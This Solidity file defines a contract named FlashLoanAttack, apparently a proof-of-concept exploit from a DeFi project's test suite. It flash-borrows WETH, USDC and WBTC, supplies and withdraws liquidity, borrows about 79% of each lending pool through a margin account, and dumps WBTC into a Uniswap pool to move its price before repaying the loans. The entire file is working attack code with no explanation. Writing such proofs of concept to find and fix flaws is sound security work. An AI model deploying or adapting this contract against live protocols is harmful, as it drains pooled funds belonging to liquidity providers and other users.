pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
import {IMarginTradingRouter} from "../../interfaces/oneClick/IMarginTradingRouter.sol";
import {ILiquidityPool} from "../../interfaces/ILiquidityPool.sol";
import {IFlashLoan} from "./IFlashLoan.sol";
import "hardhat/console.sol";

contract FlashLoanAttack {
    IERC20 public usdc;
    IERC20 public weth;
    IERC20 public wbtc;
    ISwapRouter public swapRouter;
    address public wbtcUsdcPool;
    IMarginTradingRouter public marginTradingRouter;
    ILiquidityPool public usdcLiquidityPool;
    ILiquidityPool public wethLiquidityPool;
    ILiquidityPool public wbtcLiquidityPool;
    IFlashLoan public flashLoan;
    address public oneClickLiquidityPool;

    constructor(
        address _usdc,
        address _weth,
        address _wbtc,
        address _swapRouter,
        address _wbtcUsdcPool,
        address _marginTradingRouter,
        address _usdcLiquidityPool,
        address _wethLiquidityPool,
        address _wbtcLiquidityPool,
        address _flashLoan,
        address _oneClickLiquidityPool
    ) {
        usdc = IERC20(_usdc);
        weth = IERC20(_weth);
        wbtc = IERC20(_wbtc);
        swapRouter = ISwapRouter(_swapRouter);
        wbtcUsdcPool = _wbtcUsdcPool;
        marginTradingRouter = IMarginTradingRouter(_marginTradingRouter);
        usdcLiquidityPool = ILiquidityPool(_usdcLiquidityPool);
        wethLiquidityPool = ILiquidityPool(_wethLiquidityPool);
        wbtcLiquidityPool = ILiquidityPool(_wbtcLiquidityPool);
        flashLoan = IFlashLoan(_flashLoan);
        oneClickLiquidityPool = _oneClickLiquidityPool;
    }

    function calculateDebtAmount()
        public
        view
        returns (
            uint weth_amount,
            uint usdc_amount,
            uint wbtc_amount,
            uint wbtc_dump_amount
        )
    {
        uint wbtc_balance = wbtc.balanceOf(wbtcUsdcPool);
        wbtc_dump_amount = (wbtc_balance * 100000) / 99999;
        weth_amount = weth.balanceOf(address(wethLiquidityPool));
        usdc_amount = usdc.balanceOf(address(usdcLiquidityPool));
        wbtc_amount = wbtc.balanceOf(address(wbtcLiquidityPool));
    }

    function approveToken(
        address token,
        address spender,
        uint256 amount
    ) external {
        IERC20(token).approve(spender, amount);
    }

    function executeFlashLoanAttack(
        uint marginAccountID,
        uint collateral_amount
    ) external {
        (
            uint weth_amount,
            uint usdc_amount,
            uint wbtc_amount,
            uint wbtc_dump_amount
        ) = calculateDebtAmount();

        address[] memory tokens = new address[](3);
        tokens[0] = address(weth);
        tokens[1] = address(usdc);
        tokens[2] = address(wbtc);

        uint256[] memory amounts = new uint256[](3);
        amounts[0] = weth_amount;
        amounts[1] = usdc_amount * 3;
        amounts[2] = wbtc_amount + wbtc_dump_amount + collateral_amount;

        bytes memory data = abi.encodeWithSignature(
            "execute(uint256,uint256,uint256,uint256,uint256,uint256)",
            marginAccountID,
            collateral_amount,
            weth_amount,
            usdc_amount,
            wbtc_amount,
            wbtc_dump_amount
        );

        flashLoan.flashLoan(tokens, address(this), amounts, data);
    }

    function execute(
        uint marginAccountID,
        uint collateral_amount,
        uint weth_amount,
        uint usdc_amount,
        uint wbtc_amount,
        uint wbtc_dump_amount
    ) external {
        // Use OneClickLiquidityPool to provide liquidity
        IOneClickLiquidityPoolProvider(oneClickLiquidityPool).provide(
            address(weth),
            (weth_amount / 100) * 20
        );
        IOneClickLiquidityPoolProvider(oneClickLiquidityPool).provide(
            address(usdc),
            (usdc_amount / 100) * 20
        );
        IOneClickLiquidityPoolProvider(oneClickLiquidityPool).provide(
            address(wbtc),
            (wbtc_amount / 100) * 20
        );

        // Margin provide collateral as before
        marginTradingRouter.provideERC20(
            marginAccountID,
            address(wbtc),
            collateral_amount
        );

        uint borrow_amount_weth = (weth.balanceOf(address(wethLiquidityPool)) /
            100) * 79;
        uint borrow_amount_usdc = (usdc.balanceOf(address(usdcLiquidityPool)) /
            100) * 79;
        uint borrow_amount_wbtc = (wbtc.balanceOf(address(wbtcLiquidityPool)) /
            100) * 79;

        marginTradingRouter.borrow(
            marginAccountID,
            address(weth),
            borrow_amount_weth
        );
        marginTradingRouter.borrow(
            marginAccountID,
            address(usdc),
            borrow_amount_usdc
        );
        marginTradingRouter.borrow(
            marginAccountID,
            address(wbtc),
            borrow_amount_wbtc
        );

        // Use OneClickLiquidityPool to withdraw liquidity
        IOneClickLiquidityPoolProvider(oneClickLiquidityPool).withdraw(
            address(weth),
            wethLiquidityPool.balanceOf(address(this))
        );
        IOneClickLiquidityPoolProvider(oneClickLiquidityPool).withdraw(
            address(usdc),
            usdcLiquidityPool.balanceOf(address(this))
        );
        IOneClickLiquidityPoolProvider(oneClickLiquidityPool).withdraw(
            address(wbtc),
            wbtcLiquidityPool.balanceOf(address(this))
        );

        marginTradingRouter.withdrawERC20(
            marginAccountID,
            address(weth),
            borrow_amount_weth
        );
        marginTradingRouter.withdrawERC20(
            marginAccountID,
            address(usdc),
            borrow_amount_usdc
        );
        marginTradingRouter.withdrawERC20(
            marginAccountID,
            address(wbtc),
            borrow_amount_wbtc
        );
        ISwapRouter.ExactInputParams memory params_1 = ISwapRouter
            .ExactInputParams({
                path: abi.encodePacked(
                    address(wbtc),
                    uint24(500),
                    address(usdc)
                ),
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: wbtc_dump_amount,
                amountOutMinimum: 0
            });
        swapRouter.exactInput(params_1);
        marginTradingRouter.swap(
            marginAccountID,
            address(wbtc),
            address(usdc),
            collateral_amount,
            0
        );

        ISwapRouter.ExactOutputParams memory params_2 = ISwapRouter
            .ExactOutputParams({
                path: abi.encodePacked(
                    address(wbtc),
                    uint24(500),
                    address(usdc)
                ),
                recipient: address(this),
                deadline: block.timestamp,
                amountOut: collateral_amount + wbtc_dump_amount,
                amountInMaximum: type(uint256).max
            });
        swapRouter.exactOutput(params_2);
        weth.transfer(address(flashLoan), weth_amount);
        usdc.transfer(address(flashLoan), usdc_amount * 3);
        wbtc.transfer(
            address(flashLoan),
            wbtc_amount + wbtc_dump_amount + collateral_amount
        );
    }
}

interface IOneClickLiquidityPoolProvider {
    function provide(address token, uint amount) external;

    function withdraw(address token, uint poolTokenAmount) external;
}
